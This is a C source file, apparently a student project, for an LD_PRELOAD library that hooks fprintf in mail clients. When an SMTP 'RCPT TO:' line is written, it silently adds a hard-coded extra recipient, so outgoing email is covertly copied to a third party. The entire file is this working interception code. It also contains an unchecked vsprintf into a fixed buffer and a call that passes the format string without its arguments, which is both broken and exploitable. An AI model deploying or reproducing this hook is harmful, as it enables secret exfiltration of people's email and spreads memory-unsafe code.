/*
* Project : CallSystemIntercepetion
* Authors : Bastien Wermeille & Malik Fleury
* Date : 08.04.2019
*/

#ifndef CC
#error "CC macro is not passed, please use the following command : \
        gcc -fPIC -shared -o libpreload.so ./preload.c -ldl -DCC=\"malik.fleury@he-arc.ch\""

#else
#define _GNU_SOURCE
#include <dlfcn.h>
#include <stdio.h>
#include <string.h>
#include <stdarg.h>

/* Function pointers to hold the value of the glibc functions */
static int (*real_fprintf)(FILE *stream, const char *format, ...) = NULL;

// Create the chain "RECTP TO: {ADDRESS}"
void createCC(char* cc)
{
  strcpy(cc,"RCPT TO: ");
  strcat(cc, CC);
  strcat(cc, "\n");
}

// Intercept fprintf
int fprintf(FILE *stream, const char *format, ...)
{
  static int isChanged = 0;
  char buffer[255];
  va_list args;

  va_start(args, format);
  vsprintf(buffer, format, args);
  va_end(args);

  // Get the real call to fprintf
  real_fprintf = dlsym(RTLD_NEXT, "fprintf");

  // Check if "RCPT TO" is inside the string
  char RECEPT_TO[] = "RCPT TO:";
  char *result = strstr(buffer, RECEPT_TO);

  // Add a "RCPT TO:" with a new address (copy carbon)
  // This modification is done only once
  if (result != NULL && isChanged == 0)
  {
      char cc[255];

      // Create the new chain
      createCC(cc);
      real_fprintf(stream, cc);
      fflush(stream);

      // Wait/check response
      char receipt[255];
      do
      {
          fgets(receipt, sizeof(receipt), stream);
          //puts(buffer);
      } while (receipt[0] < '2' || receipt[0] > '5');

      isChanged = 1;
  }

  // Call the real fprintf
  return real_fprintf(stream, format);
}

#endif
